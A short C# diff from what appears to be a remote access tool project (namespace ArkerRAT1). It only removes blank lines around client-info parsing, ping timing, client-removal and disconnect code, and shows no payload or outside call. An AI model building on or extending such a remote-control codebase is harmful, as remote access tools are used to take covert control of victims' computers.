@@ -151,10 +151,7 @@ namespace ArkerRAT1
 
                             foreach (var clientInfoData in tempInfo.Split(','))
                                 clientInfo += clientInfoData + "\t";
-                        }
-
-
-                        
+                        }                      
                     }
                     else
                     {
@@ -164,8 +161,6 @@ namespace ArkerRAT1
               
             } while (true);
         }
-
-
 
         string whenToStartPinging = "";
         Stopwatch stopwatch;
@@ -200,7 +195,6 @@ namespace ArkerRAT1
                 
             });
         }
-
         public void RemoveThisClientUI()
         {
             Task.Run(() =>
@@ -215,7 +209,6 @@ namespace ArkerRAT1
                 }
             }); 
         }
-
         public async void Disconnect(object sender, EventArgs e)
         {
             RemoveThisClientUI();
